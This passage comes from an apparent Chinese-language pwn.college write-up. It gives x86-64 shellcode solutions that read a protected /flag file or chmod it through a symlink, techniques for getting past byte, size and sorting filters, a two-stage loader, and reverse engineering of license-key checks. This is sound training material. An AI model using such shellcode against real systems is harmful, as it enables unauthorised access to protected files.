<span class="hljs-built_in">ptr</span>[<span class="hljs-built_in">rip</span>]<br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x0e</span><br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x05</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">inc</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span>[<span class="hljs-built_in">rip</span>]<br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x0e</span><br><span class="hljs-meta">    .byte</span> <span class="hljs-number">0x05</span><br><br><br></code></pre></td></tr></table></figure>

<blockquote>
<p><code>gcc -Wl,-N --static -nostdlib -o shellcode-elf shellcode.s</code></p>
<p>要记住编译时需要使用这些参数，以保证.text段是可写的，因此才能修改.byte 0x0e.</p>
</blockquote>
<h4 id="level6-2"><a href="#level6-2" class="headerlink" title="level6"></a>level6</h4><p>前4096个字节不给写的权限，那我直接填充这4MB的空间即可。</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-meta">.rept</span> <span class="hljs-number">0x1000</span><br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-meta">.endr</span><br></code></pre></td></tr></table></figure>

<p>nop填充即可。</p>
<h4 id="level7-2"><a href="#level7-2" class="headerlink" title="level7"></a>level7</h4><p>不给输出了现在，那么通过shellcode创建一个文件，然后把flag写进去就好啦。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>	<span class="hljs-keyword">nop</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x00000067616c662f</span>			# <span class="hljs-string">&quot;/flag&quot;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span>						# /flag<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0</span>							# read only<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span>							# 系统调用号<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rax</span>                        # /flag的fd<br><br>    # <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x74756f2f706d742f</span>         # <span class="hljs-string">&quot;/tmp/out&quot;</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x00</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x74756f2f706d742f</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">01</span>|<span class="hljs-number">0100</span>                    # O_WRONLY|O_CREAT<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0777</span>                       # 权限<span class="hljs-number">777</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span><br>    <span class="hljs-keyword">syscall</span><br><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span>						# <br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">r10</span>						# /flag的fd<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span>							# offset <span class="hljs-number">0</span>,从第一个字符开始打印<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">1000</span>						# 输出长度<br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">40</span>							# 系统调用号<br>    <span class="hljs-keyword">syscall</span><br><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">60</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>



<h4 id="level8-2"><a href="#level8-2" class="headerlink" title="level8"></a>level8</h4><p>限制在<code>0x12</code>个字节的shellcode，通过<code>chmod</code>系统调用，修改&#x2F;flag的权限即可。</p>
<p>好神奇的软链接！</p>
<blockquote>
<p>linux下，软链接到一个程序时，修改这个软连接文件会导致原文件的权限也被修改。因此可以通过软链接来重命名一个a文件，0x61这样就能减少字节数。</p>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">4</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure>



<h4 id="level9-1"><a href="#level9-1" class="headerlink" title="level9"></a>level9</h4><p>本来想通过<code>jmp [rip+10]</code>指令然后+nop填充来跳过int3的，但是这条指令就占了6个字节。后来发现jmp  标签只需要两个字节。更简单。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">4</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">jmp</span> next<br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0xa</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br><span class="hljs-symbol">next:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">60</span>					# sys_exit<br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>



<h4 id="level10-1"><a href="#level10-1" class="headerlink" title="level10"></a>level10</h4><p>它的过滤器如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint64_t</span> *input = shellcode_mem;<br><span class="hljs-type">int</span> sort_max = shellcode_size / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; sort_max; i++)<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; sort_max-i<span class="hljs-number">-1</span>; j++)<br>        <span class="hljs-keyword">if</span> (input[j] &gt; input[j+<span class="hljs-number">1</span>])<br>        &#123;<br>            <span class="hljs-type">uint64_t</span> x = input[j];<br>            <span class="hljs-type">uint64_t</span> y = input[j+<span class="hljs-number">1</span>];<br>            input[j] = y;<br>            input[j+<span class="hljs-number">1</span>] = x;<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>而我的shellcode只有13个字节，13&#x2F;8 &#x3D; 1。再减1就是0。那么就不会执行过滤器。所以我执行后就拿到了flag。它实际会将16个字节以上的shellcode进行排序。</p>
<h4 id="level11-1"><a href="#level11-1" class="headerlink" title="level11"></a>level11</h4><p>这道题是level10 加上删去读取stdin。可是使用chmod修改权限的shellcode压根就不需要stdin。网友还是厉害，想到了<code>chmod</code>这个方法。后面的几关都直接过了。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">4</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br>    <span class="hljs-keyword">syscall</span><br>    <br></code></pre></td></tr></table></figure>



<h4 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h4><p>This challenge requires that every byte in your shellcode is unique!</p>
<p>这一关需要每个字节是第一次使用，也就是没有重复的字节出现。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>, <span class="hljs-number">0x4</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">ebx</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>

<blockquote>
<p>我居然一直不知道esi寄存器的存在，我以为只有a,b,c,d寄存器会有32位，16位，8位寄存器。</p>
<p>通用寄存器都有低至16位的寄存器。</p>
</blockquote>
<h4 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h4><p>限制shellcode为0xc个字节！上面的exp还能删减一下。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-number">0x4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>

<p>这样就正好是0xc个字节。</p>
<h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p>shellcode只能是6个字节，我靠。看看人家的wp做吧，没有什么思路。</p>
<p>发现得用当时的一些寄存器来达成目标。在调用我们的shellcode时，可以看到rax是0。并且</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> <span class="hljs-built_in">RAX</span>  <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RBX</span>  <span class="hljs-number">0x627f8b68e7e0</span> (__libc_csu_init) ◂— endbr64 <br> <span class="hljs-built_in">RCX</span>  <span class="hljs-number">0x766dd2e1e297</span> (write+<span class="hljs-number">23</span>) ◂— <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">rax</span>, -<span class="hljs-number">01000h</span> /* <span class="hljs-string">&#x27;H=&#x27;</span> */<br> <span class="hljs-built_in">RDX</span>  <span class="hljs-number">0x26a69000</span> ◂— <span class="hljs-keyword">push</span> <span class="hljs-number">61h</span> /* <span class="hljs-number">0x83e78948616a</span> */<br> <span class="hljs-built_in">RDI</span>  <span class="hljs-number">0x766dd2efe7e0</span> (_IO_stdfile_1_lock) ◂— <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RSI</span>  <span class="hljs-number">0x766dd2efd723</span> (_IO_2_1_stdout_+<span class="hljs-number">131</span>) ◂— <span class="hljs-number">0xefe7e0000000000a</span> /* <span class="hljs-string">&#x27;\n&#x27;</span> */<br> <span class="hljs-built_in">R8</span>   <span class="hljs-number">0x16</span><br> <span class="hljs-built_in">R9</span>   <span class="hljs-number">0x10</span><br> <span class="hljs-built_in">R10</span>  <span class="hljs-number">0x627f8b68f113</span> ◂— <span class="hljs-number">0x525245000000000a</span> /* <span class="hljs-string">&#x27;\n&#x27;</span> */<br> <span class="hljs-built_in">R11</span>  <span class="hljs-number">0x246</span><br> <span class="hljs-built_in">R12</span>  <span class="hljs-number">0x627f8b68e200</span> (_start) ◂— endbr64 <br> <span class="hljs-built_in">R13</span>  <span class="hljs-number">0x7ffe2e2e5a80</span> ◂— <span class="hljs-number">0x1</span><br> <span class="hljs-built_in">R14</span>  <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">R15</span>  <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RBP</span>  <span class="hljs-number">0x7ffe2e2e5990</span> ◂— <span class="hljs-number">0x0</span><br>*<span class="hljs-built_in">RSP</span>  <span class="hljs-number">0x7ffe2e2e5948</span> —▸ <span class="hljs-number">0x627f8b68e7c3</span> (main+<span class="hljs-number">636</span>) ◂— <span class="hljs-keyword">lea</span> <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0cdah</span>]<br>*<span class="hljs-built_in">RIP</span>  <span class="hljs-number">0x26a69000</span> ◂— <span class="hljs-keyword">push</span> <span class="hljs-number">61h</span> /* <span class="hljs-number">0x83e78948616a</span> */<br></code></pre></td></tr></table></figure>

<p>rax为0，那么就是read系统调用号。read系统调用的第一个参数rdi为文件描述符，需要为0。第二个参数rsi为读取存放的地址，这里应该就是rdx&#x2F;rdi都行。第三个参数rdx为0x26a6900为写入的字节数。</p>
<p>那么也就是需要重写rdi寄存器和rsi寄存器即可。stageone的代码：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">edi</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">edx</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>

<p>随后，把stagetwo的代码读入即可。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">.intel_syntax</span> noprefix<br><span class="hljs-meta">.global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-meta">    .rept</span> <span class="hljs-number">0x10</span><br>    <span class="hljs-keyword">nop</span><br><span class="hljs-meta">    .endr</span><br>    <span class="hljs-keyword">push</span> <span class="hljs-number">0x61</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br>    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">esi</span>, <span class="hljs-number">0x4</span><br>    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>, <span class="hljs-number">0x5a</span><br>    <span class="hljs-keyword">syscall</span><br><br></code></pre></td></tr></table></figure>

<p>需要一个填充，因为前六个字节也被覆盖了，因此执行只能从第七个字节开始。</p>
<p>最后的命令是<code>cat stageone-raw shellcode-raw | /challenge/babyshell_level14</code>。抽象的是，我在gdb里调试了半天，stageone的代码一直无法进行系统调用，我以为是代码的问题，实际上是权限不够，无法进行syscall。</p>
<h3 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h3><h4 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h4><p>这题很简单哇，就是把输入的字符串转成了ascii。对应输入即可获得flag</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Ready</span> to receive your license key!<br><br><span class="hljs-attribute">quit</span><br><span class="hljs-attribute">Initial</span> input:<br><br>        <span class="hljs-attribute">71</span> <span class="hljs-number">75</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span> <span class="hljs-number">0</span>a <br><br><span class="hljs-attribute">The</span> mangling is done! The resulting bytes will be used for the final comparison.<br><br><span class="hljs-attribute">Final</span> result of mangling input:<br><br>        <span class="hljs-attribute">71</span> <span class="hljs-number">75</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span> <span class="hljs-number">0</span>a <br><br><span class="hljs-attribute">Expected</span> result:<br><br>        <span class="hljs-attribute">63</span> <span class="hljs-number">6</span>c <span class="hljs-number">6</span>a <span class="hljs-number">79</span> <span class="hljs-number">62</span> <br><br><span class="hljs-attribute">Checking</span> the received license key!<br></code></pre></td></tr></table></figure>

<h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1.1"></a>level1.1</h4><p>这下没有回显了，只能通过工具逆向一下子了。</p>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107202238497.png" srcset="/img/loading.gif" lazyload class="" title="image-20241107202238497">

<p>也很简单啊，直接看到了匹配的字符串。</p>
<h4 id="level2-0"><a href="#level2-0" class="headerlink" title="level2.0"></a>level2.0</h4><p>依然，使用IDA 看看：</p>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107202710303.png" srcset="/img/loading.gif" lazyload class="" title="image-20241107202710303">

<p>但是输入会把最后两个字节翻转。最后输入xzujs即可。</p>
<h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2.1"></a>level2.1</h4><p>依然是，没有回显。简单查看一下逆向出来的源码。</p>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107204303139.png" srcset="/img/loading.gif" lazyload class="" title="image-20241107204303139">

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+buf+<span class="hljs-number">2</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_10], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+buf+<span class="hljs-number">3</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_10+<span class="hljs-number">1</span>], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_10+<span class="hljs-number">1</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+buf+<span class="hljs-number">2</span>], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+var_10]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+buf+<span class="hljs-number">3</span>], <span class="hljs-built_in">al</span><br></code></pre></td></tr></table></figure>

<p>其中，<code>rbp+buf</code>是用户输入的地址。按照逻辑分析：该代码将用户输入的第3个字节给了<code>rbp+var_10</code>位置。第4个字节给了<code>rbp+var_10+1</code>位置，随后第4个字节给了第3个字节位置。第3个字节给了第4个字节位置。综合起来即，将用户输入的第三、四个字节位置交换。</p>
<p>那么输入<code>loodc</code>即可。</p>
<h4 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">quit</span><br><span class="hljs-attribute">Initial</span> input:<br><br>        <span class="hljs-attribute">71</span> <span class="hljs-number">75</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span> <span class="hljs-number">0</span>a <br><br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `reverse` mangler.<br><br><span class="hljs-attribute">This</span> mangled your input, resulting in:<br><br>        <span class="hljs-attribute">0a</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">75</span> <span class="hljs-number">71</span> <br></code></pre></td></tr></table></figure>

<p>显然，这是将输入进行逆序了。<img src="/2025/03/01/pwn-college-题解/image-20241107210124444.png" srcset="/img/loading.gif" lazyload  alt="image-20241107210124444" style="zoom:200%;" /></p>
<p>其实也不用IDA，通过回显的ASCII码可以推出要的结果。</p>
<p>最后输入<code>sikky</code>即可。</p>
<h4 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h4><p>查看源码：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">loc_153E:</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_14]<br><span class="hljs-keyword">cdqe</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-built_in">rax</span>+buf]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_16], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">4</span><br><span class="hljs-keyword">sub</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_14]<br><span class="hljs-keyword">cdqe</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-built_in">rax</span>+buf]<br><span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_15], <span class="hljs-built_in">al</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_14]<br><span class="hljs-keyword">cdqe</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rbp</span>+var_15]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-built_in">rax</span>+buf], <span class="hljs-built_in">dl</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">4</span><br><span class="hljs-keyword">sub</span>     <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">rbp</span>+var_14]<br><span class="hljs-keyword">cdqe</span><br><span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">edx</span>, [<span class="hljs-built_in">rbp</span>+var_16]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span>+<span class="hljs-built_in">rax</span>+buf], <span class="hljs-built_in">dl</span><br><span class="hljs-keyword">add</span>     [<span class="hljs-built_in">rbp</span>+var_14], <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107211657926.png" srcset="/img/loading.gif" lazyload class="" title="image-20241107211657926">

<blockquote>
<p>cdqe指令：EAX符号位拓展到RAX</p>
</blockquote>
<img src="/2025/03/01/pwn-college-%E9%A2%98%E8%A7%A3/image-20241107212701406.png" srcset="/img/loading.gif" lazyload class="" title="image-20241107212701406">

<p>有点抽象的是，无法知道[rbp+var_14]的值，因此手动分析不出来哇。通过IDA查看源码，发现循环了两次，第一次是交换第一个字节和第5个字节。第二次是交换第二个字节和第4个字节。因此就是一个逆序。</p>
